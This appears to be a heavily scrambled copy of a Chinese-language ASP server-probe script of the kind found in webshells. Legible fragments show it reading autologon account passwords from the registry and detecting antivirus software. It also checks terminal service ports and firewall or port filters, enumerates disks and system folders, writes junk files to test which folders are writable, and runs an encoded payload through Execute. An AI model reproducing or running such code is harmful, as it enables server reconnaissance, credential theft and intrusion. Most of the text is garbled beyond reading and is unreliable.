e-ir6-WL~4#CW;ΩtfPnΩΘ>tb<Θ&A|'b-_\#Θ>i$<Θ 6rirW-WsnoF|eRΩACb]H\'j~qohU 7t VCb9HF6}{"oh"=A{roFΩΘ>]I<a量变径路c前当统系Θ[2]OrI8e{opsK!ΩΘ>rb<.--.t29.t.9..-t--.--tt28.92t2t-9.-29Θ etO]18P	WfF	e!Ω`Θ;ΘBbtaP9xoS(])lp	&iM-:xΩΘ>V}<持支A_件软毒杀列系星瑞>Ol<ΘT2r"Ve42i=oF	e!{neh T4ΘX~O||tΘLoxJiMraP(zrsni{OiΩΘ>Vh<持支}c件软毒杀克铁门赛>)G<Θ,e%ir{.eC=T3	6!T{2ho,)Θi'rivO%W5ΘL7O=sbtcK(trsniBxiΩΘ>rh<持支:_件软毒杀列系山金,>AG<ΘT6]OVW-es~opC2!B~6bP9VΘv5lΘ,Tknih-:mUV-|=s,fAΩΘ>rh<持支:_件软毒杀lmAK>iG<Θ e-|Ge22|J7Es2R ~ehPT5ΘmFsPΘ T8nsbtcK(rt	=){oOΩΘ>]h<持支:K制控6r6bwyn}NP克铁门赛>iG<Θ e-|Ge22|J7Es2R ~ehPT5ΘKV6bmM=aaEΘ,Tknih-:mUV-|=s,fAΩΘ>rh<持支:_器务服MXq>il<Θ[etO]I8PCW4E	e; nPhTTVΘ1pwJT|i"faΘLoxJihtHe't-	W|{oiΩΘ>tb<持支`_务服库据数ellcrO>sc<Θ P%At{-6~7pCeR,neZP9iΘPGN:GfΘ,4onAMtaP4]]~O[8sΩΘ>rX<持支:=务服库据数	QSyZ>il<Θ{6tiV646	=PF	PRTnebT VΘk[L/TΘ'fx=iM-awUrts~|[kOΩΘ>*h<持支a_务服库据数	;S~h>il<Θ9etit1.e	=TF	2z{~PhP )ΘVev]2iBFCiTr8o7rNsmΘ,oo=)M-Hm{t-s{s kAΩΘ>rb<持支`_本脚av5=>iF<Θ96-|*e2Ps=op	eRT=Wh {5Θ:^:jΘB7f{shtaT{*]	~)TkOΩΘ>Gh<持支}K本脚lreo>il<Θ{6tiV646	=PF	PRTnebT VΘkGKEΘBT8{|h]HP6ttsnXTOsΩΘa持支件c软统系Θ[2]OrI8e{opsK!Ω)ht5mtf7^66	:9Gn7f=ih-aPΩVΘZr*TΘUF2r|.]~eFJori\=w8b	1&M-aw]f4~ΩΘ>1=KVis th<>Vh<g测探件c软统系B>t}<>]b<>rb<ΘTW9OtI-WCn4EsWYΩΘ>lo3<Θnt%Ωo/Tj~EΩΘ>tb<Θ9& dzTwss5mnijf	4-"_{=,Θ A码密户帐的_录登动自ΘSVRΩf1TJSkΩΘ6ikclΘSt%Ωrc6lC.V]wΩJPb#TtVE9kIΩ`MeKsLcPniXPLo-"c{=Th]HTn|go"ot":6#H6!FW;.b	w9\ dr7m|HTW|X7LT]u5ΩΘ>rb<ΘBj em5Wre	S{sjfs4-qaT& Θ,:户帐统系的_录登动自Θ^]!Ωi/6P]WCUJOgTwotuHTg{b-_eJOgTwo]0a(d*WRgeY(XsBT_{P#_JVPsSnijoLf%0*ΩP$pΩ{2ho,09\ el}:W3~O0fw7t0iss9fIΩ)AWKelh_nE~|]4"f]'H,&ThtHPn|FT/7]0:6}a6%gWY.XsBT7{PFI:JknAXowTtuALAΩΘdroP|saT%$'H86$Θ,n 5eK	sae=A&7wT%0:ΩΘeTHNG6sUtF"_kPJΘ[&{/ePte(nigD	otu5ΩΘWog7,{sw}y4-qAΘT= /eK2kX*~3{|]fL4-ucΩΘ|nog7kWs{pWfs	rWztJWrru=TN ,od~|I|-8P7Vc|M\kRA6PpfU|B93aCiv_	iCOLcqw_|Θ,7TM-awJiXTLotCcΩfI jWEΩΘ>3]X<Θ,d[]V7P#re- &TΘT`口端a务服端终前当ΘUt!Ω2ikE{ΩΘ>/Gh<.制限到受否是限权查检 L口端端终到得法无Θ^zYΩ,~6Zo,09><{GebmC?.rr3[rO,ΘΘT_{-]PKwVe% fXΩΘ>lf<录登动自及K口端务服a端终ΘUt!ΩVM2K]VowGaniw]6],=[Z]HPrtoK$aniPGet(j_eRj2!8QC,{n,t]oPwre%ΩΘ]W1w'?%GfPΘ{n M6Ktr7ec5~Ol]6-ΩΘ\#aT9wDR\L{oit5]SnO6=tPM*6U,l:niwrePv$DV]{fqvt6UlTttnos%W6VVG!|vEm~Y~=MLK%Θ9= h]_PtVfwGH=)TVPtΩ}roBss:e{"j4	fr"a{LeF5nre	SWsj7sf]qa9By6Pelb*{EniXPLo-"c{L2chH~E=ig7Lo%"/LO{F|7Ω5e_	scKnig7,P]qH[ xPKG6sV{igo/Ttua{JhtHe{sjfs4-qaTmiJΩtrfeFzP]9 M2K]VowGaniw]6],Lh%5TtG4PGcnimzWt msoΩ)ΘlF2b~2%xsV$S6Θ(t$ejhiW9H6G!4]eZVe~{= X	m[]PUΩΘ.t9.-29-92---82---9.--.t29.t.9..-t--.--tt28.92t2t-9.-2Θ{etiV6(6	~P\PRΩΘ>tb<ΘjtrooIAP&Θ}为口端6rebmMJ:_m>OF<ΘTetOrW-2iS7Fi2!ΩΘ2r6bwMJAcp装安否c是机主7认确请(取获=法无Θn-*fK{Aw{n6bt ΘΘ=9GoPWim fXΩVM612*6bBy=AcE(d:2!&PY4Zi6=]VoweAPΩΘtVfm5-HoeWTCm|m6rsySF{oist6Vt~2Gtq!&6VPhmyn:cpv_W9~5F5~vEY:WmmOS\k9/*s:Z7w:CZw_QBKHΘ=AWKer6hwy~)NFΩΘ>]I<Θ=-rfPmVeTdΘA为口端WlOZG2~Tl5~iFteT>Ok<Θ{P-)]e2eiJoFieRΩΘ机主本版rK^reS{|wo&=Ae为否是c认确请-取读`法无Θ\-VoemrPT =2b{,ΘΘ\r]TemtPT9kIΩ)yP`ltP '}5PR]6R8bsW=9GoPmt6TΩΘrPhF'M%*4Tpp_t\	dTv}L3&t=CJ6\tPvG6S lH=)TVP#vG7rrJo0=teSmTrtn4utnP]G'svZ3 UY^\EMIH!)ha"iqi	7Y31HΘ_xeKmV2#ΩΘ>V}<Θd]Vo#]nGm&Θ:口_端9Wnleo>il<ΘTW]O]18P	nfpsPRΩΘ)置设7认默{E6Θn]{kmTn6bT9ΘΘ\troT%WG ,O|Ω`/eP]eJ$eT(#ceRg6z.h	6_]Vfm]~FTΩΘ%roTte=kW{pu4K=]eZVe~]enlPP&]o7|ft$ih{\3!AWTXZS\Ec/HC:NKw:!Qwc*E`HΘ=/ek%2{mPoΩΘ>K_2zs	 GM<>r}<%测探=口端c殊特9>]h<>Gh<Θ{Wtirn4esn4xse%Ω8A{&=6Ω]#PNΩΘ>rb<--tt28.92t2t-9.-29---.t.9...t9.-29-92---82---9.-Θ P%At{-6~7pCeRΩoi }=BΩ4O{J=BΩΘ>rh<Θ W]irW22|J7E|2YΩ-xWJΩΘ,Θ#5j(wD$laP${ e-|Ge22|J7Es2RΩ)Bolk:##qUJ=0fBV,om{)woFk_F&q'}Jqo,w \9j rDxΩΘ:为口端pd'的`许允>iF<Θ96-|*e2Ps=op	eRΩ2C$+ΩΘ>tX<部全`为口端\d'的c许允>AG<Θ e-|*e2P|=4EsWYΩn6bT 0J50(w4claE}0{Vf[ΘΘ\A](molFap}"94XΩ`w3(kl'g(J5eRgP;(M	{7m4FlcFd'Ωxi dSBΩΘ>rB<Θ[etO]I8PCW4E	e;ΩtxPNΩΘ,ΘdVd.B4$kc\c],ersrW.PCW4E	6;Ω`Bo$GaFNt(dS0oBU{PT AmTGF:xa-4d=uo[L &TdBV4pΩΘA为口端#_t的=许允>i$<Θ etO]18P	WfF	e!Ω6sGBΩΘ>rb<部全`为口端pct的=许允>il<ΘTW]O]18P	nfpsPRΩn2ZmB]\5G6moGFa#at r7TΘΘ7`]4,fGFa#at{xIΩ)Pmllum'daP;]6%-h{nwfllHpc%Ω`(+=EJ\/dh]Hp_KDUlF"\Ω_ kgwjEAjMt5w=PC{$luFΩΘ]roT}WP7kciTJUvΘ=K;EΩΘs%]To&6Lf$kAKsT=Θ\KTEΩPCc6ΩΘ>VI<选筛KX/#aT没>Al<Θ KrirW86sn7\i6%ΩTW6b  K=rPtl|8#"Earf?TfsΩoI9jnEΩΘ>Vh<置设有没或取读法无~MJ`认默>sF<Θ96tsGW.eL{ops6zΩesFpΩΘ>t}<Θgt-	S9D&Θa为SN37卡网>"F<Θ92r|re2eiJopsP;ΩW6b [ΘΘ><Vti~N$9fIΩ)AWKSN$'daP;]6%-h{nr%sSMDΩΘr2MGKU6F:?vΘ&E&p/#htaT&N61U3ΩkO JJEΩΘ>Gb<置设有没或取读法无关网>"$<Θ e])rW22iJ7\|6%ΩPskEΩt#eNΩΘ>]X<Θ=`d{M:w6-al#Θ:Θ&j=Θ关网>)G<Θ,6%sVW46sJTpse[Ω5yaw6]aG4}{'7h{{7- VyaBet:*6#~'Th	&j{VopΩJehT,VN5{P]:r4yctr5ii fbΩ5yeKx_We-:lU&:6tjPR-hs{=y:6W9HrΩΘM:L2t50t$'afeJvΘgE&EydM-aw\y6PyaWKraGΩfs[dnkΩΘ>Gh<置设有没或7取读法无址`地KX>ik<Θ Pti]64K	JT\i2RΩ6	lBΩ]xeNΩΘ>]I<Θ=A}{t&d/KI#Θ`为Θ&j&Θ址a地wI>iG<Θ e-|Ge22|J7Es2RΩ)Vdd)e3.&J0fXS 4- 5tddAT1'j~qPhwnj9tomΩ{ehTBΘΘ><)0U*ddHe3{o1Ω4xP1P1(dHerF2!-bI&G}d5TIΩΘierd&)mWpΘ= }F:&b]aK_yeKo3ΩΘ\sea_frP%{WpC*6-Pm:raT\p|\N{pW_AMr6U\}u0teUkPt-~P!|vEm~Y~=ENI%qAM_wyCO"7R31aΘ7M-HPΩΘ>rb<Θ&B}\/\Θa为列序的Θ#AdΘ卡网Θ92tsVW46snoEC6YΩAΘΘLΘ&2aOvW$\ΘB5i(s##A(ea_lpP;_E&\yΩ7.As}pA4dn"f,	,4mT5CdF:(JJuoB"&){V7\ΩTJPhm{)JpA(AcrrA/ fXΩVM61}xi4&a2RgPR.ZCIJ	j#)ΩΘJ=iEpe]5kni"vxsE$#vPcAZr6~\10greSl4*tn7!=ykPnQUpM,KHΘnye`}#}ΩoW9}{pΩ1\VerGifpO\9]7MΩW2M  ΘΘ_6lhcnEs"9ro u7el}:{3	|[kXΩAy2KpOpcP2$1HJB{J:etje!8hsWn2chH~wCsΩΘ	rW]lspytiz0ceS6cba~p=V2]6wHr:P\Eip_P=LPaAMG2S|-e~Gort~fu]~P*]'$\h3T~RS\M/PHΘ=y6ePIT!m6Fh_JkΩΘ>1&ezOs ]Z<>Vh<0测探K络网BΘ 6-iGe.es~fxP%Ω4ΘkGPh~8tFArcsnΘ6tce&Ioe-:Wt$&hB,t2sΩh	w #|JΩ9#6{TW#uPr9torrPTW4ΩA4P8JXlcJiTGeTtK] bui)
^0h,N6	Hg2(s-at2 FLjBxkcF)
RWpon	2(eVO]2{u<miBwB wi#rh=4^! b7]J6V&!{HFiFn=$en%2GB$6$k#:djOn]\0 cPkcEH9|Jj=}{bXNoloz_#ddj>"
;WEfWP2W]itP "TT<{%>O
;eEo{e.WV|]6,u<P$,c$5s_TBHKcd>系统信息<A#D>u
YPCx4~	e-WrOteTL9B<Am;>L
%eiFonsP-1tO-6T/, <oR>O
RKipon6.WV|r6,L<oJ,akig~=m|}JmP{XFNfl4V=&6cfc$}>/
z2Eo{e8IritK9"  <#AB"p9PO}]Mnf2R b7rd2]_g,aWk$\aj&i{X=5 $2cG	E__s~g_u>/
ReL#ons6(WrO%W{u<#Y>u
Re	po=CW-{tA%WT"{,<m$><Fx9#{$7cftnrWj>/
ReL#ons6(WrO%W{	%_]P
;esEonC24nVsr29L<AgO?o></ 3>/
z2Eo{e8IritK9"<TY>"
;WEfWP2W]itP "TT<{J><e>L
%eiFonsP-1tO-6TT	g
R6iponLW.Wrs]e u<"K><LoJ>"
RPspf=iK2eG|r2 /</mY>"
;6E7WC62WGst69"  <"TABww>"
!6	\PJ	P.6ri-e L<"{J>O
;eEo{e.WV|]6,u[T<3T!>"
Res3Tnse81ri-29/,T<o%>"
RPspf=iK2eG|r2 /<T7{cla	C7o[kW}>u
Ye#onsK4Wri]6 "u
WoTOGHj=G Tben
!K	FT=i2.eVir6 " ,</cT;#T]/pW\b'rtonB^alu67关闭 o~_$s$E7,BOn}ow2clfCW.A	u>O
YPs#4nse26*s-P[L/
BGs6
ReL#ons6(WrO%W{uT[<XMPST -yp2&XC-]T=9MaGqe_返回{onCF|9+n6h|-oGx.XT(-1iQ'>"
Re	\TJ	2(eVOt2 "u
p=JBOk
!2sF7ni6.WrO%6{u<LP$>"
R6iponLW.Wrs]e uT9<3Pz>u
;esEonC24nVsr29L<A A,wE>"
wJ&,n"h
p'narionB!ed(]r)
!6&T7{u<FiNT,cokfGJmkx.z.2>u j{str,d[/<3\ic >O
3{d FC{cti4W
U"X{U__JJViMeF7rm{V
JsFTp^OBJrAZeB
^6],gni{n ~6rZWr.CzWate4Ije$%6/U_*sE-i=g.gil2^ML-6FiXgea-"5
Re	\PJ	P(6tOtW{"<Xr>"
ResFPnsP-ItO%6{u<T)BLk w|}rhn..G9hot&eG\0 aF|0Jn$6=]Pr9aeG$pad#Ang=I[ceFkiFH_)Jjn1Tbg$olf]_Tokx8x8>/
!6spo~C68{V)%6,"9{<o!>"
!esp4Wse26Gs-2[/< DTcoFsp:=_x,a$:iC=o[HW5d>磁盘/系统文件夹信息<y#$>u
YPs#4nW.Wr"re "{[</ ;>/
[{g7rTEa$h 3]A|PE9|{TF~x.7tive	
YP	xfJ	e4ersre "B9<TR{_lij=_TO}DGP,ckas	=TwP7>u
;WCp4~sW8Wri-2[/<gQ;y,aN]i4{="
!esp4Wse26Gs-2[/+:c%io~=S_:{dVs^2j3rs\e_/
RPCx4~	6-eVir6 $Giveq4DriZ6Le-%Wt
*6	Eo=se2wr|%WBu{F2rZojnPTt>"
*6	EP=P.Lti]W "<{7 wij]h=e4O#$Z*UD_)d"><B>盘符<y,><Am3>L
VeiFonsP-,tO-6T/<T7{wsJth=Wa"&cM*(3_Vj/>L
VPs\on	e.m]A9P{7]AMeE2DGsveLP%]6V
]6	pTJs64wri9W ":<LTD>L
V2|F7~s2.wVit2TO< $9mA}tMn2C/&chV{pDA=i><[>类型<AB></TD>O
r6|po~CW8B])]P,"<TD,wi}%bJeuOdNZrUD75#">"
[{UPc2a- q5s69Dri|WB.Dt)ve 5#6
[{sHs2 1a R2C#D~W-L]i]P O可移动/
 ,!_P,$A{%eiFoJie.wzAte /本地硬盘i
,Tq5	2[Ia,R2sp7ns2-LzO]WTO网络磁盘L
, q5se 5A[YP	xfJ	e4Prsre "7-ROyi
,Tq5	2[)a,R2sp7ns2-LzO]WTO;Ay磁盘u
{ Ca	2[6F	6A{%eiFoJie.wzAte /未知类型i
,TBJ&Tn6FPc%
%es\f{LP8I]A%e{u<"oD>"
z6	EP=P.Iti]W "<{7><IcmUT,%MFP&|'}wi% vHlu2&详细报告><3o7>O
YPs#4nse26*s-P[L<3FZYM>O
RKipon6.WV|r6,L[{<3T;>"
 T9Wp-
;WCp4~sW8Wri-2[/,,<PY,c$5s_TBTd>"
Y6sp7=i626*s-P L<FxRMT:N9O4{&O
YPs#4nse26*s-P[LN:crsoJ_ScFD$der#\ol&2G\u
YP	pfnsP.W]|rK,m~i4*e]UpWaialgfcjPV'G`
!6sFTnse-Irit6[" w2rM7}7K7	t>  u
;2i37Ji246rs-e9/<TD,:csj~7#s&d$6><,>WiSJows文件夹<LB><ym$>L
%Ps\on	e.6]A9P{O<m3 a7liFan=D>i
%6CF7ni6.eGiteBpSO.r6tSE2NsHk\4F&e](0A
;2i37Ji246rs-e9/</TJ>i
%6CF7ni6.eGiteBO<TD{_lij=_TO}DGP><1NP;T %5#Kn0hF|t{\a$'e=详细报告><y#$>u
YPs#4nW.Wr"re "<LFO%N>/
z6	Eo=se2Wr|%WBu{9<"PR>u
Yesp7=|62{*|]P O{ <mR cmcss=o TD>L
%2|F7~s2.WVit2TO<g"!N9:c]Oo{\"
%2|F7~|28{rA]e{O?Ac9Aon=~9FoF}Wt=lPG&Pr&"
ReC\TS	646G|t6,F~".Ge-^x6$O_km7lJ6rU})
[WspoJ|e.{]A]PTi{wPtZodnPoC%>B,/
!2sF7ni6.WrO%6{u<#3{HlAXn\FiddmW><B>nys-2FIe文件夹<LE></PD>u
;2i37Ji246rs-e9/<TD,_PG	E_=\D>O
YWspoSie.Wt)te,l~"2*6]UEe_iaFFok}Wz475
;eEo{e.WV|]6,u<yoJ>O
YWspoSie.Wt)te,L<oJT_GOjn&mi&dl2><bMK(P9%yFP=i'bmi-T	5Fq6&详细报告></m$>/
ReL#ons6(WrO%W{u<Lmx%M>"
ReC\TS	646G|t6,"9{</T%>i
%6CF7ni6.eGiteBO  <oz cF:inP oJ>"
RPspf=iK2eG|r2 /<FZYM a$%)4~ni
%eiFoJie.WzAte /+Ac-|TJn^9m7Fd2r&gol}2GJu
;WCp4~sW8Wri-2[mUx(*6-S#6csclFomJer(-4
%2iF7=|62{r|te," #2rh7j_eTCt>, O
Re	\PJ	P(6tOtW{"<mD amAgn=T)ddF2><[>系统临时文件夹<A[><yTD>"
;WLE4{CW-WtOtW{"<TJT94F	x:Jn3>/
!espD{se.e*itPTp~x-k6-Up2ciHlFfkJKVUzV
R6	pTJse.{])]P,i<A D>/
!espD{se.e*itPTO< 3[5FOg==mOddk2><XcwSmTtxEe_ubmO%[ZHFG2\详细报告><"oD>O
RKipon6.WV|r6,L<AgxRN>"
R2C#D~W-I]i]P O{ </ ;>/
z2Eo{e8IritK9"</oyBLk><E%>i
%eCpo~se-6G"-69L<3Iz,a$sgn=$2W]PV>L
RWp4{se.nGite{i  <lZYvTya-Oo=="
R2C#D~W-I]i]P ONActOfW\U$\fG&eG{m6rhodJwost>指定文件夹查询：i
%2iF7=|62{r|te,"<19w	 {r5#2=]Pxr{namP&\4F&6]>u
Ye#onsK4Wri]6 "<1?K;P[]/Ee&su}mi%T^*F'W&生成报告>　指定文件夹路径。如：l:|:Sw|"
%2|F7~|28{rA]e{O<br>N:\r69ycF2G<3h*>u
;esEonC24nVsr29Ld}prWayclP]i
%6CF7ni6.eGiteBO<br>9:\B##'}<LhV>"
RPspf=iK2eG|r2 /$:=Fhp"
z6	EP=P.Iti]W "<1G>c:|xroj]cT,8)GP	"
RPspf=iK2eG|r2 /, <AFORv>i
%6CF7ni6.eGiteBO<DIz>"
^W],ln"nMo%hi~g
p{#,~0h
S'} ~aanDV|	64J*|ZP)
DsF FSf'Tes]ori\2'EHC6m7Fd2r, em\lTm&6GC'PeTE_~]r,D
/k,J*|ZP <> /O ThK{
S6] FUi9\,^6t\Pr-CrPat2fX^Par{O^ctOprsng.g|c6U/|%6wOX&ear")
~et o6stJ]AZPT7{gUO-Ge-Dr|MW.JtAMWV
Xf9oestJ])ZP2/CYPaJx oben
memp=ntr,&9/<,/>磁盘分区类型：u,&TRe&(T2CrdVs^24liGPSMtemATg{u<s1>磁盘序列号：u j{R6J(TeLrDriZ6.SP]A5F9GT}PrV &,"<,1>磁盘共享名：',#9;W}(oPsr$rivP-nMHV695we5{&{O<LI>磁盘总容量：O & Y6d(s1{]4P6-Jr|ve2To%:$VO2Wy}G4^y7e`) &,L<wX>磁盘卷名：iT#,RWj(oWstDzAve.zPluw2?5w24{=,"<LI>磁盘根目录:"Td9V$YW6G{($Vi^6 & uA&/AA
~Pt9EaWFol#Wr ={#es-3Gs\2(Y77tlol&er
~K-{m2F\F4FdWts =,w_PgPkjPr4~uhpoldKGs
mPr k:NM,3[s~,T2mpgol}2GL
m2F\_~-r9\ Tew\`~-V[d{u<	W>文件夹：/9& Sl!eWrUo)
9Wf-
~P- PemEFok}Wz,\99T%hs~g
Set,w_PgPkjPr9\ cTthiS]
EG|e
PWTE7n]V,=TTewp_^%GB={O<	1>磁盘根目录}u j{Red4L不可读~UuA
$Om9oeT#Fol#WrLi],ta%_u
#6wE_^tr,= P2F3c~r]9d /<L3>" &,;6j4u穷举目录测试：iV
TWTpmTldez	ist{7 AV]cx4L,s~&oms"L"w|={9uBOmA="BuwAJ200]LJ/BOW[^u,OPehO,"w"{me"Biwi~}TP	.!u]u,LasE",L\b3uBOPTflu,O$ocuw2W]	,_=j,SW]ts{gs"wOProX*am,lAGPCiBuXn2tpqb" Lx9E/'LL#p'}"'/tftEL4
gP]{O _{0{ro U1TundU#emElTG&2*wO	tV
Xf l^Z-g4$}W]EfOsr(DrOM6{=,iA|u j{T6FpFomJerLs|t(OV5{ Z6J
tT= -+1
mKwFK^r] \,TWTp_S-][#,u<,W>发现文件夹："9# ~NReWz6DriZ6 &,L`|uTg{ Pm\FoFde],AL-UAV5
3~d9sf
M25]
/8{-=C{tMWn TKFp_S]* =,PWTE7n]V,&T"<"I>已穷举LTjBJtAMWT&{u盘根目录，但未有发现:6/
E~}[so
^6- m6s]7rivK9= N4]hi~F
U2]{gUOT= MotZ|{&
m2F\_~-r9\ Tew\`~-V[d{u<	W>注意：/9& RKJ("不要多次刷新本页面，否则在只写文件夹会留下大量垃圾文件!/4
v2iHF6{JViMe = "A磁盘信息L'{PT#7~%rBI
3nd O8
k~DT~qb
S'X ScXTldet'foF}WtAT
x~ prr7r ;2iCw699WOt
DAT FSx Qm7FD2tLTWTpmTldez'Scm0,S
~6-T\~x,=TSeVve]-qzP5r2Thj6$t6/ScrO\]s~j(lsFe~xs]WmOb^Wct"`
IoTp~x-\4F&e]ExOstC{xDFjW]5TTMPn
Set,i\4F&6]{n p~O8letFD$derUOol&2G`
n6-,T2mpgol}2GL,\9ipfljPr4~ubF7kD6V	
~$miX \9"<Lb>指定文件夹根目录：" &{ncRP6GUofcjPV)
F7r p:Nh,~9|{TT6wpp4ldeVC
,U9#j _{SaFsg&'<LI>文件夹：/[& U_!6{]'~A, 
NPxt
~K-{m2F\F4FdWts =,9P]bOWF
SW] "poldKG = cPthO=]
pcP
^cm	g &T~lw]TjT"<"I>文件夹：/ & %2DUo7c}6V j{"不存在或无读权限RO)
+{d ik
S$#iX,&[~$wsF &,"<,1>注意：',#9;W}(/不要多次刷新本页面，否则在只写文件夹会留下大量垃圾文件C"5
Se-T\~x,7Tc7tbsnX
MeLiage{i文件夹信息",U_Fj b
kn} Sqb
l0S$]Af{TSa%eIt(foF}6tA
iJ,EGtot9ResCFe N65t
3AT,ln"L eCtF7ld2]'{PrlAkewOsrBReWV^]tL%W}mOlWJaTW
SKr FS"[= U2GZP](0VPa%eo}je_%6'UaG|#%iJj.psleS/C]6wxIg6$tO`
~et {WstF4cdeVT_{g^Q80Ptlol&er{8Tm&6GV
S6- m6stFOk6wO	]T\,TWtmTldez4SubmPldP]i
;WjgOl2nawe &TOF-6F\OT&{JaMUnowATg{|7G]U~oL` #9MinCre(n4,) =T~6$fWj4~om) = "-%F3u
lT] 3Hcb{A i~T#6	-\|GPLAt
Nex9
If{6rr,Pb6~
6VV.!leHr
;WnV~r]9& k7lJ6r &,L<mxM#Ta7lTt=pxf226z> 不可读,/
FUi40V2_]P eOtFOleT8Tm&6GTjTRJ&FAGenaw2JoVq6
Xf96rt9TheS
ert(ClP:G
;6eVUt] =,Re6]~9V{jTO不可写。</mxNm>"
kk|6
z2eVSrt \9ReWz~tr #["可写。<3lZc >i
gSi.DPle%2p"F698Tkd6V j{Rndg|c6~Hl2B r06
Bnd bx
EG|e
;WeV^]t,n 8ol&erTd9'<mZ9mTc4FoG\#ffe.$->,可读JL
F~".0GeatKmextm)le,8TG&2*{=,R=dFOle=:FKLoG"W
Wo Wtr Tb2W
P*]8slW5r
ReWz~tr \[Re{]~]VTg{u不可写。</lON >"
Bm	6
!2WtUtG{= RP6*~-V[d{u可写。<"mOcm>"
pSO.$6le-2psF2[k7Fd2r = R=}p"F6{:F2,oVuW
En&T)k
w=j,ix
~Wt TKitFiG6Li	%9\,9P]bOnF
UetTPWL-mTkJ2r{n ?4thi~F
UP]TmUO9\ cTthiS]
SazeWVT_{%21tU-r
E~d l"{l-sT=
f'~crson jfI5$l'V
sW] "xso J9SerZ6r.s]W5-2Qh8Pc%("Ucr|\r"~X4lAke~/sr6mOb829]uA
Pt94f4$derB_ OfP.GP%x4F}6t4UeCsi7n(LlTm&6Gec%h/A)
if ~f]{7oPkjPr4WsYTotFD$der{]he~T
^;6E7nCe.Bri%29'<N]A\t>UhTPFol&2*UuuidYPPc]hUTfol#Wr.p5*en-8TG&2*`=u"L)<3sc]|#9>/
Wks6,
LResEfWP2,]s-e9/<Nrip9>ShoP\ol&2GUuLi#UPsCio~("lf$#Ptw:rZ"`="O/)</	_*sE->L
RWp4{se.EGite{i<cP=r6V>已经是磁盘根目录了Y<3$e=teV>"
!K	FT=i2.eVir6 " ,<96~-6]><bG><W?PUTBrype\Iut-f{{\:c'Pn返回 fnCFicE&uhOrfG5.X7(27);'><LhV><yaPnr6r>O
eSJ if
se-TZk	f7J7-h|ng
s2%9Do4$}W]=J7tbsng
2Wj,oG=a-iTJ
WxecCre M4*fisfJ6VK'7DI3[90]32((ex5 .oe44)51})346y(bIe524.W51(47E246x1486Df655KzII/J/N-0}oT!A1qB-.>82,$:)Ua%3ZugpQ@#}4M\Y_cgg3qS({np^XI-KkhXT&C&nFknI-e"B3Y]5#q@,fXIgX%:yd%+c078VP%B]J8'(.VRE-Z g>Ma)^QVu/*3` MPD9w1J0X9f=]O?B]-Oxqb2_g)SxI_G3BH4\;hSyqMo|xtc[6o`)FyIC5 e.Xc@'wi(9!P+AQKC/]U^J+-nY;Gw/!3hpf&8H.dYvz/SUKlvIs%,7aXa&2Nc}wKCZ1UM(A1<ERPh7oIU^\~jE@k'v-KL)
ey6cutPT{OUU'Lhqs9jn6Ωxi dSWΩfI jWEΩyH]GiPZ]{=,Θ>|l<Θ,SR;Ω2imkΩ]y2?ΩViU/aGtAeh-Tg{Θ>Oc<Θ{UR!Ω`y5GrAehr(dn'PBU,fm{]&){V7FΩ=eh  )5:Gz:6b%65atVAiW fIΩAZ]5TPh%U&aWYg6!.XsE_yartyeh-ΩVΘb]He6M-Θ4tCeuYeR&Zr*T6b%Ω5Θkl6bS4]pir$^1ΘU-$6ghxer5etq.re|GeS \[XsBTr6UΩ%56M,e#usPR ]fGzk{{iΩ{2h],ΘΘ><`ΘhtaT2h]Θ4-|2'Ye!{fsΩΘ>/rh<>mrokL<Θ U;!ΩΘ>6V']Owb"s.wro8-i"b]u&f_iG$nT{'值 键 读6&6'FH	TJ7tr'b\WpytBrupns<Θ S%;ΩΘ>uf&62O	 J'=Pul:M9h-5w2b%=6wa{{tup~|<{Θ,Uz;ΩΘ>3 Gh<>rcelKi/<Θ ~zRΩΘ>~fA]EfL<口端TsT的放开许允>'s-roe}WE7G$)w!T|dEzEE55s3-.DI./mgA200Eo-99+.-827:64:j |	295oVe%nIpsr2%WPHtce=\iF$T=eci\]6~pI!G]PS$4r]{oC\ZBTSY~&ML1au\P"c5\,nfitEo<ΘT^![ΩΘ>JT|r\oA<口端P7V的放开许允>'s-]PK&P,fGFAw$U|:E2B+a5CD^f31./pm:tuu[5-[9Ef-8.Kae5i.W=CeaHfG6tnIpC*6-Pl:tHP=FiFNT\sKNivr6n\1]Gr6UkPt-~o!\MkTSq^=Z"_+J_2uGHv9JoitEf<Θ{U%zΩΘ>J7irFoA<放开火防>'Pm:98Ip\t	|	|	%*4T~e\OyFlahf$up6$|xfrK&rcjnatUvNaOFPeGFaL6rsp\srKremat_P\	CWa$)D6VHh^\sPciM]WVp]W^$fr]~oq]nerV"u|vk#^QU\hwK*u=eumcv n4)tp7<Θ9~%;ΩΘ>J7Ot\o/<go,TWmqjWZN^>,btcKgoLp%W6j:0=sFuJ6ha~\tfDiorcsZ\E%)Iogin|kMIaCAv_L)!Z/cQB`+J=6qlcZ noO%x4<Θ,n;YΩΘ>nTstFT/<3滤过3A/pc]>'sV2rGOlN]OVu_eSPlb:=BFEs#_mvs6$i^teS\-2nG7V]=4st{6rt0C\M+mSYS|wNI|!/yc,y0x"_qEK|'=2"$*\{{fA%p4<Θ ~YRΩΘ>n7|]F73<.滤过FO/#at>usre9$iFy])ru$2~6Fh_Jkpp|pc \s2_A|V6~vzG0]PS$4rtn7!&yk nq~pE?WH0/M_L}qOL_QwKH6&W'F:	{~7i%po<Θ S;;ΩΘ>S7sr\Ty<7滤过Ei"Fct>6C*6-F)lx-iG'c6~elb*{E\psxcTpCWaOM*6Up1G0tPSlf]rS70=NBPSQU\BcIHC:N`w:sQ,=*EP*'\Wula|9noi]xo<Θ,^!YΩΘ>=Ps-Eoy<口端态状W/nA_e>ΘΘ9V4wC0%a]UP3KCT\w2]/U&=4OsG6V]{errCq\er6hwy~)NFp_6]~Hm5S\kRA6PpfU|h,PaΘΘ=6qlcZ noO%x4<ΘUz;ΩΘ>~oA]p4"<口端据数WyS/cP>ΘΘ]*oPH%c$T1m0 pm2ts/S\=fALV6U%{2rtqC=6rehB5Wi$E&_6-ncTy~=ERAnmFOS|ZLK|ΘΘ&W'F:	{~7i%po<ΘSR;ΩΘ>{DO]#f"<口端9^D3>ΘΘtebmq9]t7T&\a -w$R|inoi9ctSns1\rPMG6UTc5~Om]eTplo]%{Ds|r2~kot-nT0tneV]G0pvwP~*S=yL_+ΘΘ=eumcv n4)tp7<Θ~Y%ΩΘ>W4O-pf/<口端5CNr>ΘΘGK}T09r]oKp4qcVni{vuc)F_2YpE!iWopOS\Z	